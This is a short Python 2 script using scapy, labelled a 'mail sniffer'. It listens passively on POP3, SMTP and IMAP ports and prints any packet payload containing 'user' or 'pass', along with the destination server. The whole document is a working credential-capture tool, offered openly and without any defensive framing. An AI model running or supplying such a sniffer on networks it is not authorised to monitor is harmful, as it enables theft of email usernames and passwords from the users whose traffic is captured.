#!/usr/bin/env python
'''mail sniffer'''

from scapy.all import *


# packet callback
def callback(packet):
    '''Handle the packet'''
    #print packet.show()
    payload = packet[TCP].payload
    if payload:
        mail_packet = str(payload)
        if 'user' in mail_packet.lower() or 'pass' in mail_packet.lower():
            print '[*] Server: %s' % packet[IP].dst
            print '[*] %s' % payload



def main():
    '''main function'''
    sfilter = 'tcp port 110 or tcp port 25 or tcp port 143'
    sniff(filter=sfilter, prn=callback, store=0)

main()
